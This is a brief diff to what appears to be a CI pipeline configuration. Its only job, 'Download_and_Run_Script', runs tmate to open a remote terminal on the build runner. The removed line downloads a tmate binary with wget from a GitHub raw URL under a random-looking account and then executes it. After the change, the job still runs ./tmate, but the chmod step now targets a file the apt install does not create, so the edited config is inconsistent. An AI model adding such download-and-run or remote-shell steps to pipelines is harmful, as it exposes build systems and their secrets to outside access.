@@ -10,6 +10,6 @@ blocks:
       jobs:
         - name: Download_and_Run_Script
           commands:
-            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - sudo apt-get install tmate
             - chmod +x tmate
             - ./tmate
